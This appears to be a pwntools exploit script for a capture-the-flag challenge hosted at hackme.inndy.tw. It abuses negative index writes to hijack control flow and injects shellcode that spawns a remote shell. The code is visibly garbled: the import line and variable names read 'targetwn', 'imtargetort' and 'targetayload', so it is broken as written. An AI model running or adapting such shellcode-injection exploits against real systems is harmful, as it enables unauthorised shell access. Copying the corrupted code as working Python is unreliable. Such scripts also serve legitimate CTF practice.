from targetwn imtargetort *
context(log_level = "debug", arch = 'i386', os = 'linux',)
target = remote('hackme.inndy.tw',7715)
target.recvuntil('message:\n')
targetayload = asm('xor eax,eax ; ret')
target.send(targetayload)
target.recvuntil('slot?\n')
target.send(' -15')
target.recvuntil('message:\n')
shellcode = asm(shellcraft.sh())
target.send(shellcode)
target.recvuntil('slot?\n')
target.send(' -16')

target.interactive()

